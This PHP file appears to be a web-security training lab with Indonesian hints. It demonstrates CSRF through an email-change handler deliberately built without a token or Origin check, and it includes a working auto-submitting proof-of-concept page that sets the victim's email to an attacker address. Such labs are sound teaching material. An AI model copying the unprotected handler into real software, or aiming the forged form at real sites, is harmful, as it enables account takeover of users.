<?php
$title = 'Lab 1: CSRF tanpa token';
require_once __DIR__ . '/lib.php';
$db = load_db();
$msg = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && is_logged_in()) {
    // VULNERABLE: no CSRF token field, no Origin/Referer check - the
    // request is trusted purely because it carries a valid session cookie.
    $db['user']['email'] = $_POST['email'] ?? $db['user']['email'];
    save_db($db);
    $db = load_db();
    $msg = 'Email berhasil diubah menjadi ' . htmlspecialchars($db['user']['email']);
}

include 'header.php';
if (!is_logged_in()) { echo '<div class="error-box">Login dulu sebagai victim, lalu buka lab ini lagi.</div>'; include 'footer.php'; exit; }

$poc = <<<HTML
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:8079/csrf/lab1_no_token.php" method="POST">
  <input type="hidden" name="email" value="attacker-owns-this@evil.test">
</form>
</body>
</html>
HTML;
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: form ubah email di bawah tidak punya token CSRF sama sekali &mdash; server
hanya mengecek cookie session valid. Salin PoC HTML di bawah ke file <code>exploit.html</code>,
lalu <strong>jangan</strong> buka lewat <code>file://</code> (browser modern menandainya sebagai
origin "null", beda perlakuan). Sebagai gantinya jalankan mini web server lokal di port lain dari
folder tempat file itu disimpan:</p>
<pre>python3 -m http.server 9000</pre>
<p class="hint">lalu buka <code>http://localhost:9000/exploit.html</code> di tab yang SAMA
(browser yang sama, sudah login sebagai victim di tab lain). Karena browser modern menganggap
sesama <code>localhost</code> beda port sebagai <em>same-site</em> (SameSite hanya melihat skema
+ domain terdaftar, bukan port), cookie session tetap ikut terkirim &mdash; persis seperti
skenario CSRF ke domain attacker sungguhan yang berbeda dari domain aplikasi.</p>
</details>

<p>Email saat ini: <strong><?php echo htmlspecialchars($db['user']['email']); ?></strong></p>
<?php if ($msg): ?><div class="ok-box"><?php echo $msg; ?></div><?php endif; ?>

<h3>Form ubah email (legit)</h3>
<form method="post">
  <input type="text" name="email" value="<?php echo htmlspecialchars($db['user']['email']); ?>">
  <button type="submit">Update Email</button>
</form>

<h3>PoC HTML (halaman attacker)</h3>
<textarea readonly rows="8" style="width:100%;font-family:monospace;"><?php echo htmlspecialchars($poc); ?></textarea>

<?php include 'footer.php'; ?>
